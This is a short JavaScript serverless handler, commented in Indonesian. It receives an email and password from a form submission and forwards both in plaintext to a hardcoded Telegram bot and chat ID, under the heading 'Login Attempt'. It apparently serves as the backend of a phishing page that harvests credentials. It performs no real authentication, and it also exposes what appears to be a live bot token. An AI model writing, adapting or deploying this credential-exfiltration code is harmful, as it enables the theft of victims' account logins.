const fetch = require('node-fetch');

// Ganti dengan bot token Anda
const BOT_TOKEN = '7973401326:AAGzmlKSqHtLMMuC2wEdSRhQkKHjBgOXfJc'; // Gunakan Environment Variable
const CHAT_ID = '1352694551'; // Ganti dengan Chat ID Anda

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    const message = `🔐 *Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
            }),
        });

        if (!response.ok) {
            return res.status(500).json({ error: 'Failed to send message to Telegram' });
        }

        return res.status(200).json({ success: true, message: 'Data sent to Telegram' });
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
